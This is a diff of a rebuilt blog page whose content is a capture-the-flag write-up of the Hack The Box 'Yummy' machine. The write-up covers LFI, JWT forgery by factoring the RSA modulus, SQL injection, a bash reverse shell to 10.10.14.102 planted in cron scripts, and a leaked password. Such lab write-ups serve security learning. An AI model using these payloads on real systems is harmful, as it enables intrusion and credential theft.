@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width,initial-scale=1">
-    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.9.0.802684146396">
+    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.11.0.807375038140">
 
     <!-- See retype.com -->
-    <meta name="generator" content="Retype 3.9.0">
+    <meta name="generator" content="Retype 3.11.0">
 
     <!-- Primary Meta Tags -->
     <title>Yummy (Hard)</title>
@@ -32,43 +32,43 @@
 
     <script data-cfasync="false">(function(){var cl=document.documentElement.classList,ls=localStorage.getItem("retype_scheme"),hd=cl.contains("dark"),hl=cl.contains("light"),wm=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches;if(ls==="dark"||(!ls&&wm&&!hd&&!hl)){cl.remove("light");cl.add("dark")}else if(ls==="light"||(!ls&&!wm&&!hd&&!hl)){cl.remove("dark");cl.add("light")}})();</script>
 
-    <link href="../../../../resources/css/retype.css?v=3.9.0.802684146396" rel="stylesheet">
+    <link href="../../../../resources/css/retype.css?v=3.11.0.807375038140" rel="stylesheet">
 
-    <script data-cfasync="false" src="../../../../resources/js/config.js?v=3.9.0.802684146396" data-turbo-eval="false" defer></script>
-    <script data-cfasync="false" src="../../../../resources/js/retype.js?v=3.9.0" data-turbo-eval="false" defer></script>
-    <script id="lunr-js" data-cfasync="false" src="../../../../resources/js/lunr.js?v=3.9.0.802684146396" data-turbo-eval="false" defer></script>
-    <script id="prism-js" data-cfasync="false" src="../../../../resources/js/prism.js?v=3.9.0.802684146396" defer></script>
+    <script data-cfasync="false" src="../../../../resources/js/config.js?v=3.11.0.807375038140" data-turbo-eval="false" defer></script>
+    <script data-cfasync="false" src="../../../../resources/js/retype.js?v=3.11.0" data-turbo-eval="false" defer></script>
+    <script id="lunr-js" data-cfasync="false" src="../../../../resources/js/lunr.js?v=3.11.0.807375038140" data-turbo-eval="false" defer></script>
+    <script id="prism-js" data-cfasync="false" src="../../../../resources/js/prism.js?v=3.11.0.807375038140" defer></script>
 </head>
 <body>
-    <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
-        <div class="absolute bottom-0 left-0 bg-gray-100 dark:bg-dark-800" style="top: 5rem; right: 50%"></div>
+    <div id="retype-app" class="relative text-base antialiased text-base-text bg-base-bg font-body">
+        <div class="absolute bottom-0 left-0" style="top: 5rem; right: 50%"></div>
     
-        <header id="docs-site-header" class="sticky top-0 z-30 flex w-full h-16 bg-white border-b border-gray-200 md:h-20 dark:bg-dark-850 dark:border-dark-650">
+        <header id="retype-header" class="sticky top-0 z-30 flex w-full h-16 bg-header-bg border-b border-header-border md:h-20">
             <div class="container relative flex items-center justify-between pr-6 grow md:justify-start">
                 <!-- Mobile menu button skeleton -->
-                <button v-cloak class="skeleton docs-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
-                <div v-cloak id="docs-sidebar-toggle"></div>
+                <button v-cloak class="skeleton retype-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
+                <div v-cloak id="retype-sidebar-left-toggle-button"></div>
         
                 <!-- Logo -->
                 <div class="flex items-center justify-between h-full py-2 md:w-75">
                     <div class="flex items-center px-2 md:px-6">
-                        <a id="docs-site-logo" href="../../../../" class="flex items-center leading-snug text-2xl">
+                        <a id="retype-branding-logo" href="../../../../" class="flex items-center leading-snug text-2xl">
                             <span class="dark:text-white font-bold line-clamp-1 md:line-clamp-2">bytebl33d</span>
-                        </a><span class="hidden mt-1 px-2 py-1 ml-4 text-xs font-semibold leading-none text-root-logo-label-text bg-root-logo-label-bg rounded-md md:inline-block">Blog</span>
+                        </a><span id="retype-branding-label" class="inline-flex mt-1 px-2 py-1 ml-4 text-xs font-medium leading-none items-center rounded-md bg-branding-label-bg text-branding-label-text ring-1 ring-branding-label-border ring-inset md:inline-block">Blog</span>
                     </div>
         
-                    <span class="hidden h-8 border-r md:inline-block dark:border-dark-650"></span>
+                    <span class="hidden h-8 border-r md:inline-block border-base-border"></span>
                 </div>
         
                 <div class="flex justify-between md:grow">
                     <!-- Top Nav -->
-                    <nav class="hidden md:flex">
+                    <nav id="retype-header-nav" class="hidden md:flex">
                         <ul class="flex flex-col mb-4 md:pl-16 md:mb-0 md:flex-row md:items-center">
                             <li class="mr-6">
-                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="../../../../blog/">Posts</a>
+                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text-weight hover:text-header-text-hover" href="../../../../blog/">Posts</a>
                             </li>
                             <li class="mr-6">
-                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://github.com/bytebl33d">GitHub</a>
+                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text-weight hover:text-header-text-hover" href="https://github.com/bytebl33d">GitHub</a>
                             </li>
         
                         </ul>
@@ -82,7 +82,7 @@
                             <div class="absolute flex items-center justify-center h-full pl-3 dark:text-dark-300">
                                 <svg xmlns="http://www.w3.org/2000/svg" class="icon-base" width="16" height="16" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 1px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
                             </div>
-                            <input class="w-full h-10 placeholder-gray-400 transition-colors duration-200 ease-in bg-gray-200 border border-transparent rounded md:text-sm hover:bg-white hover:border-gray-300 focus:outline-none focus:bg-white focus:border-gray-500 dark:bg-dark-600 dark:border-dark-600 dark:placeholder-dark-400" style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search">
+                            <input class="w-full h-10 placeholder-search-placeholder transition-colors duration-200 ease-in bg-search-bg border border-transparent rounded md:text-sm hover:border-search-border-hover focus:outline-none focus:border-search-border-focus" style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search">
                         </div>
         
                         <!-- Mobile search button -->
@@ -100,7 +100,7 @@
                     </div>
         
                     <div v-cloak class="flex justify-end grow">
-                        <div id="docs-mobile-search-button"></div>
+                        <div id="retype-mobile-search-button"></div>
                         <doc-search-desktop></doc-search-desktop>
         
                         <doc-theme-switch class="lg:ml-2"></doc-theme-switch>
@@ -110,25 +110,26 @@
             </div>
         </header>
     
-        <div class="container relative flex bg-white">
+    
+        <div id="retype-container" class="container relative flex bg-white">
             <!-- Sidebar Skeleton -->
-            <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-white border-gray-200 sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton dark:bg-dark-800 dark:border-dark-650">
+            <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-sidebar-left-bg border-sidebar-left-border sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton">
             
                 <div class="flex items-center h-16 px-6">
-                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-white border border-gray-200 rounded shadow-none text-sm focus:outline-none focus:border-gray-600 dark:bg-dark-600 dark:border-dark-600" type="text" placeholder="Filter">
+                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-filter-bg border border-filter-border rounded shadow-none text-sm focus:outline-none focus:border-filter-border-focus" type="text" placeholder="Filter">
                 </div>
             
                 <div class="pl-6 mt-1 mb-4">
-                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
-                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
-                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
-                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
-                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
-                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-32 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-48 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-40 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-32 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-48 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-40 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
                 </div>
             
-                <div class="shrink-0 mt-auto bg-transparent dark:border-dark-650">
-                    <a class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
+                <div class="shrink-0 mt-auto bg-transparent dark:border-base-border">
+                    <a class="flex items-center justify-center flex-nowrap h-16 text-gray-350 dark:text-dark-400 hover:text-gray-600 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
                         <span class="text-xs whitespace-nowrap">Powered by</span>
                         <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
                     </a>
@@ -138,23 +139,23 @@
             <!-- Sidebar component -->
             <doc-sidebar v-cloak>
                 <template #sidebar-footer>
-                    <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-dark-650">
+                    <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-base-border">
             
-                        <div class="py-3 px-6 md:hidden border-b dark:border-dark-650">
+                        <div class="py-3 px-6 md:hidden border-b dark:border-base-border">
                             <nav>
                                 <ul class="flex flex-wrap justify-center items-center">
                                     <li class="mr-6">
-                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="../../../../blog/">Posts</a>
+                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text-weight hover:text-header-text-hover" href="../../../../blog/">Posts</a>
                                     </li>
                                     <li class="mr-6">
-                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://github.com/bytebl33d">GitHub</a>
+                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text-weight hover:text-header-text-hover" href="https://github.com/bytebl33d">GitHub</a>
                                     </li>
             
                                 </ul>
                             </nav>
                         </div>
             
-                        <a class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
+                        <a class="flex items-center justify-center flex-nowrap h-16 text-gray-350 dark:text-dark-400 hover:text-gray-600 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
                             <span class="text-xs whitespace-nowrap">Powered by</span>
                             <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
                         </a>
@@ -162,14 +163,14 @@
                 </template>
             </doc-sidebar>
     
-            <div class="grow min-w-0 dark:bg-dark-850">
+            <div class="grow min-w-0 bg-body-bg">
                 <!-- Render "toolbar" template here on api pages --><!-- Render page content -->
                 <div class="flex">
-                    <div class="min-w-0 p-4 grow md:px-16">
+                    <div id="retype-main" class="min-w-0 p-4 grow md:px-16">
                         <main class="relative pb-12 lg:pt-2">
-                            <div class="docs-markdown" id="docs-content">
+                            <div class="retype-markdown" id="retype-content">
                                 <!-- Rendered if sidebar right is enabled -->
-                                <div id="docs-sidebar-right-toggle"></div>
+                                <div id="retype-sidebar-right-toggle"></div>
                                 <!-- Page content  -->
 <doc-anchor-target id="yummy-hard" class="break-words">
     <h1>
@@ -186,7 +187,7 @@
 </div>
 
 <p><figure class="content-center">
-    <img src="../../../../assets/images/headers/yummy.png" alt="" />
+    <img src="../../../../assets/images/headers/yummy.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
@@ -205,7 +206,7 @@
 </doc-anchor-target>
 <p>Our initial port scan only shows two ports open: SSH on port 22 and a web server on port 80. By looking at the <code v-pre>http-server-header</code>, we identify that the server is running Caddy as a reverse proxy.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none"># Nmap 7.94SVN scan initiated Sun Oct  6 14:04:12 2024 as: nmap -p- -sCV -v -oN yummy.nmap 10.129.74.97
+<pre translate="no" class="language-none"><code v-pre class="language-none"># Nmap 7.94SVN scan initiated Sun Oct  6 14:04:12 2024 as: nmap -p- -sCV -v -oN yummy.nmap 10.129.74.97
 Nmap scan report for 10.129.74.97
 Host is up (0.014s latency).
 Not shown: 65533 closed tcp ports (conn-refused)
@@ -223,26 +224,26 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
 </doc-codeblock></div>
 <p>Navigating to the website redirects us to <code v-pre>yummy.htb</code>. We add this domain to the <code v-pre>/etc/hosts</code> file and continue to explore the webpages. The website is hosting a restaurant application to manage appointments and reservations. After creating an account and logging in, we can make a new reservation.</p>
 <p><figure class="content-center">
-    <img src="../../../../assets/images/writeups/yummy/booking.png" alt="" />
+    <img src="../../../../assets/images/writeups/yummy/booking.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
 <p>From our dashboard, it is possible to save our reservation to a calendar file (ics) via the <code v-pre>save iCalendar</code> option.</p>
 <p><figure class="content-center">
-    <img src="../../../../assets/images/writeups/yummy/save-icalendar.png" alt="" />
+    <img src="../../../../assets/images/writeups/yummy/save-icalendar.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
 <p>The request makes a call to the <code v-pre>/export/Yummy_reservation_YYYYMMDD_hhmmss</code> endpoint where the date is the current timestamp of the export. This endpoint is vulnerable to LFI and we can alter the request to read arbitrary files as the <code v-pre>www-data</code> user. Another thing to notice is that the cookie uses a JWT token which can be decoded with tools like <a href="https://gchq.github.io/CyberChef/">CyberChef</a> or <a href="https://jwt.io/">jwt.io</a>. Decoding the token, there&#x27;s a role <code v-pre>customer</code> and fields <code v-pre>e</code> and <code v-pre>n</code> are specified, which are essential encryption exponent and modulus respectively.</p>
 <p>Manipulating the GET request to <code v-pre>/export/../../etc/passwd</code> gives us Arbitrary File Read.</p>
 <p><figure class="content-center">
-    <img src="../../../../assets/images/writeups/yummy/lfi.png" alt="" />
+    <img src="../../../../assets/images/writeups/yummy/lfi.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
 <p>From the <code v-pre>/etc/passwd</code> file, we can already identify several users on the machine.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">root:x:0:0:root:/root:/bin/bash
+<pre translate="no" class="language-none"><code v-pre class="language-none">root:x:0:0:root:/root:/bin/bash
 dev:x:1000:1000:dev:/home/dev:/bin/bash
 mysql:x:110:110:MySQL Server,,,:/nonexistent:/bin/false
 caddy:x:999:988:Caddy web server:/var/lib/caddy:/usr/sbin/nologin
@@ -250,7 +251,7 @@ qa:x:1001:1001::/home/qa:/bin/bash</code></pre>
 </doc-codeblock></div>
 <p>Further enumeration reveals that the contents of the <code v-pre>/etc/crontab</code> file contains some scripts.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">*/1 * * * * www-data /bin/bash /data/scripts/app_backup.sh
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">*/1 * * * * www-data /bin/bash /data/scripts/app_backup.sh
 */15 * * * * mysql /bin/bash /data/scripts/table_cleanup.sh
 * * * * * mysql /bin/bash /data/scripts/dbmonitor.sh</code></pre>
 </doc-codeblock></div>
@@ -263,7 +264,7 @@ qa:x:1001:1001::/home/qa:/bin/bash</code></pre>
 </doc-anchor-target>
 <p>The contents of the <code v-pre>app_backup.sh</code> script reveals the location of a zip file in the <code v-pre>/var/www</code> directory.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">#!/bin/bash
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">#!/bin/bash
 
 cd /var/www
 /usr/bin/rm backupapp.zip
@@ -271,14 +272,14 @@ cd /var/www
 </doc-codeblock></div>
 <p>We can download the backed-up file from <code v-pre>/var/www/backupapp.zip</code>. This zip file is a backup of the original source code located in <code v-pre>/opt/app</code>. Once unzipped, we can view the content of <code v-pre>app.py</code>.</p>
 <p><figure class="content-center">
-    <img src="../../../../assets/images/writeups/yummy/backup.png" alt="" />
+    <img src="../../../../assets/images/writeups/yummy/backup.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
 <p>We can proceed to do some code analysis and see if we can spot additional vulnerabilities or credentials. The login method in <code v-pre>app.py</code> looks interesting. The pair of RSA keys are generated in the <code v-pre>config/signature.py</code>. The validation is done in the
 <code v-pre>middleware/verification.py</code>.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-python"><code v-pre class="language-python">if user:
+<pre translate="no" class="language-python"><code v-pre class="language-python">if user:
     payload = {
         'email': email,
         'role': user['role_id'],
@@ -297,7 +298,7 @@ else:
 <p>It uses the <code v-pre>signature.py</code> module to encode the payload into a JWT token. The payload does contain the RSA modulus n and the encryption exponent e. With knowledge of these values, we can decode any JWT token to find the original prime factors p and q and break the encryption.</p>
 <p>Let&#x27;s have a look at how we can decode our <code v-pre>customer</code> token and modify it to become <code v-pre>administrator</code>.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-python"><code v-pre class="language-python">import base64, json, jwt # pip install pyjwt
+<pre translate="no" class="language-python"><code v-pre class="language-python">import base64, json, jwt # pip install pyjwt
 from Crypto.PublicKey import RSA
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import serialization
@@ -332,7 +333,7 @@ print(new_token)</code></pre>
 </doc-codeblock></div>
 <p>We insert our current user JWT token in our script and run it. This will then print out a new JWT that has the <code v-pre>administrator</code> role and should be able to access the admin panel. Further along in the code of <code v-pre>app.py</code> there is also an SQL Injection vulnerability in the <code v-pre>admindashboard</code> endpoint.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-python"><code v-pre class="language-python"># added option to order the reservations
+<pre translate="no" class="language-python"><code v-pre class="language-python"># added option to order the reservations
 order_query = request.args.get('o', '')
 
 sql = f&quot;SELECT * FROM appointments WHERE appointment_email LIKE %s order by appointment_date {order_query}&quot;</code></pre>
@@ -345,13 +346,13 @@ sql = f&quot;SELECT * FROM appointments WHERE appointment_email LIKE %s order by
 </doc-anchor-target>
 <p>Let&#x27;s perform a search query on the admin dashboard and intercept the request with BurpSuite. We can confirm the SQL Injection by making the server sleep for several seconds.</p>
 <p><figure class="content-center">
-    <img src="../../../../assets/images/writeups/yummy/sqli.png" alt="" />
+    <img src="../../../../assets/images/writeups/yummy/sqli.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
 <p>By using SQLMap we can check our user privileges:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-shell-session"><code v-pre class="language-shell-session">$ sqlmap -r request --privileges
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ sqlmap -r request --privileges
 
 [15:27:11] [INFO] retrieved: 'FILE'
 database management system users privileges:
@@ -360,7 +361,7 @@ database management system users privileges:
 </doc-codeblock></div>
 <p>We have <code v-pre>FILE</code> permissions, meaning we can read and write arbitrary files. Remember we still have a couple of cron scripts we haven&#x27;t looked at yet, one of which is the <code v-pre>dbmonitor.sh</code> script owned by the <code v-pre>mysql</code> user. After we download this file via the same method as before, some things stand out.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">&lt;SNIP&gt;
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">&lt;SNIP&gt;
     if [ -f /data/scripts/dbstatus.json ]; then
         if grep -q &quot;database is down&quot; /data/scripts/dbstatus.json 2&gt;/dev/null; then
             /usr/bin/echo &quot;The database was down at $timestamp. Sending notification.&quot;
@@ -381,13 +382,13 @@ fi
 <p>If the file <code v-pre>dbstatus.json</code> exists and does not conain the string &quot;database is down&quot; then it runs a command with <code v-pre>/bin/bash</code>, afterwards it deletes the JSON file. This script is ran every minute. The <code v-pre>latest_version</code> variable lists the contents of the scripts folder with a wildcard. This script will sort all scripts starting with <code v-pre>fixer-v</code> and executes the last matching script (tail). Since we can write files via the SQL injection vulnerability, we can get a reverse shell.</p>
 <p>First we create a reverse shell script and run a Python web server.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-shell-session"><code v-pre class="language-shell-session">$ echo &quot;#\!/bin/bash\nbash -i &gt;&amp; /dev/tcp/10.10.14.102/9001 0&gt;&amp;1&quot; &gt; shell.sh
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ echo &quot;#\!/bin/bash\nbash -i &gt;&amp; /dev/tcp/10.10.14.102/9001 0&gt;&amp;1&quot; &gt; shell.sh
 $ chmod +x shell.sh
 $ sudo python -m http.server 80</code></pre>
 </doc-codeblock></div>
 <p>We create a small script that automates the exploitation. It first grabs our payload, writes it to <code v-pre>/data/scripts/fixer-v999</code> and then writes an empty string to <code v-pre>/data/scripts/dbstatus.json</code> in order to execute our payload.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">ip=&quot;10.10.14.102&quot;
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">ip=&quot;10.10.14.102&quot;
 token=&quot;&lt;ADMIN_JWT_TOKEN&gt;&quot;
 
 write_file() {
@@ -402,7 +403,7 @@ write_file &quot;&quot; &quot;/data/scripts/dbstatus.json&quot;</code></pre>
 </doc-codeblock></div>
 <p>We start a netcat listener on port 9001, run the above script and after a minute we should have received a connection back to our machine.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-shell-session"><code v-pre class="language-shell-session">$ nc -nvlp 9001
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ nc -nvlp 9001
 mysql@yummy:/var/spool/cron$</code></pre>
 </doc-codeblock></div>
 <doc-anchor-target id="user">
@@ -419,7 +420,7 @@ mysql@yummy:/var/spool/cron$</code></pre>
 </doc-anchor-target>
 <p>After getting a shell as the <code v-pre>mysql</code> we still have very limited access. We can move laterally to the <code v-pre>www-data</code> user since there is also a script (<code v-pre>app_backup.sh</code>) that runs every minute by this user. We are able to remove the backup file and replace it with the same reverse shell script.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-shell-session"><code v-pre class="language-shell-session">mysql@yummy:/var/spool/cron$ cd /data/scripts
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">mysql@yummy:/var/spool/cron$ cd /data/scripts
 mysql@yummy:/data/scripts$ wget http://10.10.14.102/shell.sh
 mysql@yummy:/data/scripts$ rm app_backup.sh
 mysql@yummy:/data/scripts$ mv shell.sh app_backup.sh</code></pre>
@@ -433,7 +434,7 @@ mysql@yummy:/data/scripts$ mv shell.sh app_backup.sh</code></pre>
 </doc-anchor-target>
 <p>We can find a password for the <code v-pre>qa</code> user in the <code v-pre>/var/www/qa_testing/.hg/store/data/app.py.i</code> file.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-shell-session"><code v-pre class="language-shell-session">www-data@yummy:~$ cd /var/www/app-qatesting/.hg/store/data
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">www-data@yummy:~$ cd /var/www/app-qatesting/.hg/store/data
 www-data@yummy:~/app-qatesting/.hg/store/data$ strings app.py.i
 'user': 'chef',
 'password': '3wDo7gSRZIwIHRxZ!',
@@ -443,7 +444,7 @@ www-data@yummy:~/app-qatesting/.hg/store/data$ strings app.py.i
 </doc-codeblock></div>
 <p>We can now SSH as <code v-pre>qa</code>.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-shell-session"><code v-pre class="language-shell-session">$ ssh qa@yummy.htb
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ ssh qa@yummy.htb
 qa@yummy:~$ cat user.txt</code></pre>
 </doc-codeblock></div>
 <doc-anchor-target id="root">
@@ -460,24 +461,24 @@ qa@yummy:~$ cat user.txt</code></pre>
 </doc-anchor-target>
 <p>The qa user can run a command as the dev user.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-shell-session"><code v-pre class="language-shell-session">qa@yummy:~$ sudo -l
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">qa@yummy:~$ sudo -l
 User qa may run the following commands on localhost:
     (dev : dev) /usr/bin/hg pull /home/dev/app-production/</code></pre>
 </doc-codeblock></div>
